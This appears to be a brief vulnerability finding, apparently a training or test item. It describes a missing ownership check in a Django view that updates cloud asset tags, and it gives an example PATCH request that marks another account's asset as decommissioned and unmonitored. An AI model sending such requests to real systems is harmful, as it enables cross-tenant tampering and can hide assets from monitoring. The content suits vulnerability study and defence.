diagnosis: AssetHStoreAttributesUpdateView updates key-value pairs stored in the custom_tags HStoreField for a cloud asset. The query CloudAssetInventory.objects.filter(id=asset_id) fails to verify that the asset belongs to request.user.customer_account. An attacker can update the custom metadata, compliance markers, and deployment flags on assets belonging to other corporate accounts.
exploit_request:
PATCH /assets/inventory/519/tags/ HTTP/1.1
Host: ops.cloudopsmanager.com
Cookie: sessionid=valid_operator_session
Content-Type: application/json

{"custom_tags": {"environment": "decommissioned", "monitored": "false"}}
